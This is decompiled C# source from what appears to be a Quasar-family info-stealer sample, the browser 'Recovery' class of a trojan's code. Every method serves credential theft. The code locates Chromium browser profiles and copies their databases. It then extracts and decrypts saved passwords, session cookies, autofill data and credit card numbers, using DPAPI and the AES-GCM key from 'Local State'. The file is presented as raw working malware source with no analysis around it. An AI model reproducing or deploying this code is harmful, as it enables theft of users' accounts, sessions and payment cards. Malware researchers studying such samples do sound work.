// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Data.Recovery.Bip
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using NoiseMe.Drags.App.Data.Hlps;
using NoiseMe.Drags.App.Data.SQLite;
using NoiseMe.Drags.App.Models.Aead;
using NoiseMe.Drags.App.Models.Common;
using NoiseMe.Drags.App.Models.Credentials;
using NoiseMe.Drags.App.Models.JSON;
using NoiseMe.Drags.App.Models.LocalModels.Extensions.Nulls;
using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace NoiseMe.Drags.App.Data.Recovery
{
  public class Bip : GH9kf<BrowserProfile>
  {
    public List<BrowserProfile> EnumerateData()
    {
      List<BrowserProfile> browserProfiles = new List<BrowserProfile>();
      try
      {
        int countCompleted = 0;
        object locker = new object();
        List<string> profile = this.GetProfile();
        foreach (string str1 in profile)
        {
          string rootPath = str1;
          new Thread((ThreadStart) (() =>
          {
            BrowserProfile browserProfile = new BrowserProfile();
            try
            {
              string fullName = new FileInfo(rootPath).Directory.FullName;
              string str2 = rootPath.Contains(strg.RoamingAppData) ? this.GetRoadData(fullName) : this.GetLclName(fullName);
              if (!string.IsNullOrEmpty(str2))
              {
                string str3 = str2[0].ToString().ToUpper() + str2.Remove(0, 1);
                string name = this.GetName(fullName);
                if (!string.IsNullOrEmpty(name))
                {
                  browserProfile.Name = str3;
                  browserProfile.Profile = name;
                  browserProfile.BrowserCookies = this.EnumCook(fullName).IsNull<List<BrowserCookie>>();
                  browserProfile.BrowserCredendtials = this.GetCredentials(fullName).IsNull<List<BrowserCredendtial>>();
                  browserProfile.BrowserAutofills = this.EnumFills(fullName).IsNull<List<BrowserAutofill>>();
                  browserProfile.BrowserCreditCards = this.EnumCC(fullName).IsNull<List<BrowserCreditCard>>();
                }
              }
            }
            catch
            {
            }
            lock (locker)
            {
              List<BrowserCookie> browserCookies = browserProfile.BrowserCookies;
              // ISSUE: explicit non-virtual call
              if ((browserCookies != null ? (__nonvirtual (browserCookies.Count) > 0 ? 1 : 0) : 0) == 0)
              {
                List<BrowserCredendtial> browserCredendtials = browserProfile.BrowserCredendtials;
                // ISSUE: explicit non-virtual call
                if ((browserCredendtials != null ? (__nonvirtual (browserCredendtials.Count) > 0 ? 1 : 0) : 0) == 0)
                {
                  List<BrowserCreditCard> browserCreditCards = browserProfile.BrowserCreditCards;
                  // ISSUE: explicit non-virtual call
                  if ((browserCreditCards != null ? (__nonvirtual (browserCreditCards.Count) > 0 ? 1 : 0) : 0) == 0)
                  {
                    List<BrowserAutofill> browserAutofills = browserProfile.BrowserAutofills;
                    // ISSUE: explicit non-virtual call
                    if ((browserAutofills != null ? (__nonvirtual (browserAutofills.Count) > 0 ? 1 : 0) : 0) == 0)
                      goto label_11;
                  }
                }
              }
              browserProfiles.Add(browserProfile);
label_11:
              ++countCompleted;
            }
          })).Start();
        }
        while (countCompleted != profile.Count)
          ;
      }
      catch
      {
      }
      return browserProfiles;
    }

    public List<BrowserCredendtial> GetCredentials(string profilePath)
    {
      List<BrowserCredendtial> credentials = new List<BrowserCredendtial>();
      try
      {
        string str = Path.Combine(profilePath, "Login Data");
        if (!File.Exists(str))
          return credentials;
        string[] source = profilePath.Split(new string[1]
        {
          "\\"
        }, StringSplitOptions.RemoveEmptyEntries);
        string localStatePath = Path.Combine(string.Join("\\", ((IEnumerable<string>) source).Take<string>(source.Length - 1).ToArray<string>()), "Local State");
        CNT manager = new CNT(rcvr.CreateTempCopy(str));
        manager.ReadTable("logins");
        for (int row = 0; row < manager.RowLength; ++row)
        {
          BrowserCredendtial browserCredendtial = new BrowserCredendtial();
          try
          {
            browserCredendtial = this.ReadData(manager, row, localStatePath);
          }
          catch
          {
          }
          if (browserCredendtial.Login.IsNotNull<string>() && browserCredendtial.Login != "UNKNOWN" && browserCredendtial.Password != "UNKNOWN" && browserCredendtial.URL != "UNKNOWN")
            credentials.Add(browserCredendtial);
        }
      }
      catch
      {
      }
      return credentials;
    }

    public List<BrowserCookie> EnumCook(string profilePath)
    {
      List<BrowserCookie> browserCookieList = new List<BrowserCookie>();
      try
      {
        string str = Path.Combine(profilePath, "Cookies");
        if (!File.Exists(str))
          return browserCookieList;
        string[] source = profilePath.Split(new string[1]
        {
          "\\"
        }, StringSplitOptions.RemoveEmptyEntries);
        string localStatePath = Path.Combine(string.Join("\\", ((IEnumerable<string>) source).Take<string>(source.Length - 1).ToArray<string>()), "Local State");
        CNT cnt = new CNT(rcvr.CreateTempCopy(str));
        cnt.ReadTable("cookies");
        for (int rowIndex = 0; rowIndex < cnt.RowLength; ++rowIndex)
        {
          BrowserCookie browserCookie = (BrowserCookie) null;
          try
          {
            browserCookie = new BrowserCookie()
            {
              Host = cnt.ParseValue(rowIndex, "host_key").Trim(),
              Http = cnt.ParseValue(rowIndex, "httponly") == "1",
              Path = cnt.ParseValue(rowIndex, "path").Trim(),
              Secure = cnt.ParseValue(rowIndex, "secure") == "1",
              Expires = cnt.ParseValue(rowIndex, "expires_utc").Trim(),
              Name = cnt.ParseValue(rowIndex, "name").Trim(),
              Value = Bip.DecryptChromium(cnt.ParseValue(rowIndex, "encrypted_value"), localStatePath)
            };
          }
          catch (Exception ex)
          {
          }
          if (browserCookie != null)
            browserCookieList.Add(browserCookie);
        }
      }
      catch
      {
      }
      return browserCookieList;
    }

    public List<BrowserAutofill> EnumFills(string profilePath)
    {
      List<BrowserAutofill> browserAutofillList = new List<BrowserAutofill>();
      try
      {
        string str = Path.Combine(profilePath, "Web Data");
        if (!File.Exists(str))
          return browserAutofillList;
        CNT cnt = new CNT(rcvr.CreateTempCopy(str));
        cnt.ReadTable("autofill");
        for (int rowIndex = 0; rowIndex < cnt.RowLength; ++rowIndex)
        {
          BrowserAutofill browserAutofill = (BrowserAutofill) null;
          try
          {
            browserAutofill = new BrowserAutofill()
            {
              Name = cnt.ParseValue(rowIndex, "name").Trim(),
              Value = cnt.ParseValue(rowIndex, "value").Trim()
            };
          }
          catch
          {
          }
          if (browserAutofill != null)
            browserAutofillList.Add(browserAutofill);
        }
      }
      catch
      {
      }
      return browserAutofillList;
    }

    public List<BrowserCreditCard> EnumCC(string profilePath)
    {
      List<BrowserCreditCard> browserCreditCardList = new List<BrowserCreditCard>();
      try
      {
        string str = Path.Combine(profilePath, "Web Data");
        if (!File.Exists(str))
          return browserCreditCardList;
        string[] source = profilePath.Split(new string[1]
        {
          "\\"
        }, StringSplitOptions.RemoveEmptyEntries);
        string localStatePath = Path.Combine(string.Join("\\", ((IEnumerable<string>) source).Take<string>(source.Length - 1).ToArray<string>()), "Local State");
        CNT cnt = new CNT(rcvr.CreateTempCopy(str));
        cnt.ReadTable("credit_cards");
        for (int rowIndex = 0; rowIndex < cnt.RowLength; ++rowIndex)
        {
          BrowserCreditCard browserCreditCard = (BrowserCreditCard) null;
          try
          {
            browserCreditCard = new BrowserCreditCard()
            {
              Holder = cnt.ParseValue(rowIndex, "name_on_card").Trim(),
              ExpirationMonth = Convert.ToInt32(cnt.ParseValue(rowIndex, "expiration_month").Trim()),
              ExpirationYear = Convert.ToInt32(cnt.ParseValue(rowIndex, "expiration_year").Trim()),
              CardNumber = Bip.DecryptChromium(cnt.ParseValue(rowIndex, "card_number_encrypted"), localStatePath)
            };
          }
          catch
          {
          }
          if (browserCreditCard != null)
            browserCreditCardList.Add(browserCreditCard);
        }
      }
      catch
      {
      }
      return browserCreditCardList;
    }

    private BrowserCredendtial ReadData(
      CNT manager,
      int row,
      string localStatePath)
    {
      BrowserCredendtial browserCredendtial = new BrowserCredendtial();
      try
      {
        if (((IEnumerable<string>) manager.Fields).Contains<string>("Password_value"))
        {
          browserCredendtial.URL = manager.ParseValue(row, "Origin_url").Trim();
          browserCredendtial.Login = manager.ParseValue(row, "Username_value").Trim();
          browserCredendtial.Password = Bip.DecryptChromium(manager.ParseValue(row, "Password_value"), localStatePath);
        }
        if (((IEnumerable<string>) manager.Fields).Contains<string>("password_value"))
        {
          browserCredendtial.URL = manager.ParseValue(row, "origin_url").Trim();
          browserCredendtial.Login = manager.ParseValue(row, "username_value").Trim();
          browserCredendtial.Password = Bip.DecryptChromium(manager.ParseValue(row, "password_value"), localStatePath);
        }
      }
      catch
      {
      }
      finally
      {
        browserCredendtial.Login = string.IsNullOrEmpty(browserCredendtial.Login) ? "UNKNOWN" : browserCredendtial.Login;
        browserCredendtial.Password = string.IsNullOrEmpty(browserCredendtial.Password) ? "UNKNOWN" : browserCredendtial.Password;
        browserCredendtial.URL = string.IsNullOrEmpty(browserCredendtial.URL) ? "UNKNOWN" : browserCredendtial.URL;
      }
      return browserCredendtial;
    }

    private static string DecryptChromium(string chiperText, string localStatePath)
    {
      string str = string.Empty;
      try
      {
        str = chiperText.StartsWith("v10") || chiperText.StartsWith("v11") ? Bip.DecryptV10(localStatePath, chiperText) : rcvr.DecryptBlob(chiperText, DataProtectionScope.CurrentUser).Trim();
      }
      catch
      {
      }
      return str;
    }

    private static string DecryptV10(string localStatePath, string chiperText)
    {
      int length = 12;
      string str1 = "v10";
      string str2 = "DPAPI";
      byte[] key = rcvr.DecryptBlob(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(File.ReadAllText(localStatePath).FromJSON()["os_crypt"]["encrypted_key"].ToString(false))).Substring(str2.Length)), DataProtectionScope.CurrentUser);
      byte[] bytes = Encoding.Default.GetBytes(chiperText.Substring(str1.Length, length));
      return AesGcm256.Decrypt(Encoding.Default.GetBytes(chiperText.Substring(length + str1.Length)), key, bytes);
    }

    private string GetName(string path)
    {
      try
      {
        string[] strArray = path.Split(new char[1]{ '\\' }, StringSplitOptions.RemoveEmptyEntries);
        if (strArray[strArray.Length - 2] == "User Data")
          return strArray[strArray.Length - 1];
      }
      catch
      {
      }
      return "Unknown";
    }

    private string GetRoadData(string path)
    {
      try
      {
        return path.Split(new string[1]
        {
          "AppData\\Roaming\\"
        }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries)[0];
      }
      catch
      {
      }
      return string.Empty;
    }

    private string GetLclName(string path)
    {
      try
      {
        string[] strArray = path.Split(new string[1]
        {
          "AppData\\Local\\"
        }, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[1]
        {
          '\\'
        }, StringSplitOptions.RemoveEmptyEntries);
        return strArray[0] + "_[" + strArray[1] + "]";
      }
      catch
      {
      }
      return string.Empty;
    }

    private List<string> GetProfile()
    {
      List<string> profile = new List<string>();
      try
      {
        profile.AddRange((IEnumerable<string>) rcvr.FindPaths(strg.RoamingAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
        profile.AddRange((IEnumerable<string>) rcvr.FindPaths(strg.LocalAppData, 4, 1, "Login Data", "Web Data", "Cookies"));
      }
      catch
      {
      }
      return profile;
    }
  }
}
